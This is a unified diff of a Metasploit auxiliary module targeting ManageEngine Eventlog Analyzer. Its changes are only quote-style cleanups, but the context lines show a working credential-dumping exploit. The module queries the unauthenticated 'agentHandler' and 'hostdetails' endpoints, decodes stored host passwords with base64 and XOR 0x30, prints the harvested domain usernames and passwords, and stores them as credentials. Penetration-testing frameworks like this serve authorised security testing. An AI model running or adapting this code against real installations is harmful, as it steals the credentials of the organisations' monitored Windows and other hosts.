@@ -42,14 +42,14 @@ class Metasploit3 < Msf::Auxiliary
     register_options(
       [
         Opt::RPORT(8400),
-        OptString.new('TARGETURI', [ true,  "Eventlog Analyzer application URI (should be /event for version 7)", '/']),
+        OptString.new('TARGETURI', [ true,  'Eventlog Analyzer application URI (should be /event for version 7)', '/']),
       ], self.class)
   end
 
 
   def decode_password(encoded_password)
     password_xor = Rex::Text.decode_base64(encoded_password)
-    password = ""
+    password = ''
     password_xor.bytes.each do |byte|
       password << (byte ^ 0x30)
     end
@@ -59,7 +59,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def run
     res = send_request_cgi({
-      'uri' => normalize_uri(target_uri.path, "agentHandler"),
+      'uri' => normalize_uri(target_uri.path, 'agentHandler'),
       'method' =>'GET',
       'vars_get' => {
         'mode' => 'getTableData',
@@ -84,10 +84,10 @@ class Metasploit3 < Msf::Auxiliary
 
     slid_host_ary = []
     doc.elements.each('Details/HostDetails') do |ele|
-      if ele.attributes["password"]
+      if ele.attributes['password']
         # If an element doesn't have a password, then we don't care about it.
         # Otherwise store the slid and host_id to use later.
-        slid_host_ary << [ele.attributes["slid"], ele.attributes["host_id"]]
+        slid_host_ary << [ele.attributes['slid'], ele.attributes['host_id']]
       end
     end
 
@@ -107,7 +107,7 @@ class Metasploit3 < Msf::Auxiliary
 
     slid_host_ary.each do |host|
       res = send_request_cgi({
-        'uri' => normalize_uri(target_uri.path, "hostdetails"),
+        'uri' => normalize_uri(target_uri.path, 'hostdetails'),
         'method' =>'GET',
         'vars_get' => {
           'slid' => host[0],
@@ -128,15 +128,15 @@ class Metasploit3 < Msf::Auxiliary
       doc.elements.each('Details/Hosts') do |ele|
         # Add an empty string if a variable doesn't exist, we have to check it
         # somewhere and it's easier to do it here.
-        host_ipaddress = ele.attributes["host_ipaddress"] || ""
+        host_ipaddress = ele.attributes['host_ipaddress'] || ''
 
         ele.elements.each('HostDetails') do |details|
-          domain_name = details.attributes["domain_name"] || ""
-          username = details.attributes["username"] || ""
-          password_encoded = details.attributes["password"] || ""
+          domain_name = details.attributes['domain_name'] || ''
+          username = details.attributes['username'] || ''
+          password_encoded = details.attributes['password'] || ''
           password = decode_password(password_encoded)
-          type = details.attributes["type"] || ""
-          subtype = details.attributes["subtype"] || ""
+          type = details.attributes['type'] || ''
+          subtype = details.attributes['subtype'] || ''
 
           unless type =~ /Windows/ || subtype =~ /Windows/
             # With AS/400 we get some garbage in the domain name even though it doesn't exist
@@ -144,8 +144,8 @@ class Metasploit3 < Msf::Auxiliary
           end
 
           msg = "Got login to #{host_ipaddress} | running "
-          msg << type << (subtype != "" ? " | #{subtype}" : "")
-          msg << " | username: "
+          msg << type << (subtype != '' ? " | #{subtype}" : '')
+          msg << ' | username: '
           msg << (domain_name != "" ? "#{domain_name}\\#{username}" : username)
           msg << " | password: #{password}"
           print_good(msg)
@@ -162,7 +162,7 @@ class Metasploit3 < Msf::Auxiliary
             service_name: type,
             workspace_id: myworkspace_id,
             protocol: 'tcp',
-            port: 0,    # can be any port, so just set to 0 else the cred api screams
+            port: 0, # can be any port, so just set to 0 else the cred api screams
             core: credential_core,
             status: Metasploit::Model::Login::Status::UNTRIED
           }
